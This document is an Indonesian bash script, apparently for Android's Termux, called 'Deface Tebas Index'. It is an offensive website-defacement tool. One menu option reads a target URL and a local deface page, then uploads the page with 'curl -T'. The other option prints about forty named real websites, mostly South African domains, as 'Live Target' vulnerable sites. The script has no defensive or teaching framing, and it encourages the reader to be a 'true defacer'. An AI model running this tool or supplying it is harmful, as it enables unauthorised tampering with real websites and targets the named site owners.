#usr/bin/bash
clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
# Jangan Recode Ya gayn
# yang Recode Besok  Mati Amin
echo $cy
echo ':::::::::  :::::::::: ::::::::::     :::      ::::::::  :::::::::: 
:+:    :+: :+:        :+:          :+: :+:   :+:    :+: :+:        
+:+    +:+ +:+        +:+         +:+   +:+  +:+        +:+        
+#+    +:+ +#++:++#   :#::+::#   +#++:++#++: +#+        +#++:++#   
+#+    +#+ +#+        +#+        +#+     +#+ +#+        +#+        
#+#    #+# #+#        #+#        #+#     #+# #+#    #+# #+#        
#########  ########## ###        ###     ###  ########  ########## 
'
echo $i
echo '(Deface Tebas Index)'
echo $ku
echo '------------------------------------------------'
echo 'Instagram: @ronis_punya_ig'
echo '------------------------------------------------'
echo $pur
echo 'Jadilah Defacer Sejati'
echo $i
echo '-------------------------------'
echo '[A] MULAI DEFACE'
echo '[B] WEBSITE VULN'
echo '-------------------------------'
echo
read -p "[PILIH]:~# "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
echo $me "Simpan SC Di Memory Internal Di Luar Folder "
echo
echo $i
read -p "[WEB TARGET]:~# "  target
echo
echo $me "Masukan Script!!! "
echo $i
read -p "[SCRIPT]:~# "  script
curl -T /storage/emulated/0/$script $target
echo $red "["$ku"Hacked"$me"]"$cy"～～～＞"$i" $target"
echo $ku
echo '[KEMBALI TEKAN TOMBOL ENTER]'
echo $cy
read -p '[BACK]' asu
clear
sh deface.sh
fi

if [ $apaan = "B" ] || [ $apaan = "b" ]
then
echo
echo $ku "Live Target"
echo $pu "http://contsol.co.za"
echo $cy "http://colourfactory.co.za"
echo $pu "http://chillibitez.co.za"
echo $cy "http://chasingfantasia.com"
echo $pu "http://centraltech.co.za"
echo $cy "http://cblandscapes.co.za"
echo $pu "http://crimsonmonkeyweb.com"
echo $cy "http://kevinbutho.com"
echo $pu "http://prorepafrica.com"
echo $cy "http://xposurephotography.co.za"
echo $pu "http://windmillsandporcupines.co.za"
echo $cy "http://tcnig.co.za"
echo $pu "http://techdirect.co.za"
echo $cy "http://thehellenic.co.za"
echo $pu "http://valdicare.co.za"
echo $cy "http://africaprop.co.za"
echo $pu "http://www.alfunctiondesigns.co.za"
echo $cy "http://athenaeum.co.za"
echo $pu "http://geotrac.co.za"
echo $cy "http://www.compu7.co.za"
echo $pu "http://enetics.co.za"
echo $cy "http://ballastbrokers.co.za"
echo $pu "http://www.ajaxfilebrowser.com"
echo $cy "http://enetics.co.za"
echo $pu "http://electrogem.co.za"
echo $cy "http://sorgatz.ch"
echo $pu "http://shls001.com"
echo $cy "http://www.learn-mt.com"
echo $pu "http://braziliansandalco.co.za"
echo $cy "http://bestilling.udir.no"
echo $pu "http://wop.zayhi.com"
echo $cy "http://troop-1539.org"
echo $pu "http://www.ratiss.org"
echo $cy "http://office.ratiss.org"
echo $pu "http://apparelworld.org"
echo $cy "http://branch.prospec.co.th"
echo $pu "http://branch.prospec.co.th"
echo $cy "http://expertads.co.za"
echo $pu "http://annettemuller.co.za"
echo $cy "http://hq.prospec.co.th"
echo $pu "http://branch.prospec.co.th"
echo $cy "http://bestilling.udir.no"
echo $pu "http://cos.co.za"
echo $ku
echo '[KEMBALI TEKAN TOMBOL ENTER]'
echo $cy
read -p '[BACK]' asu
clear
sh deface.sh
fi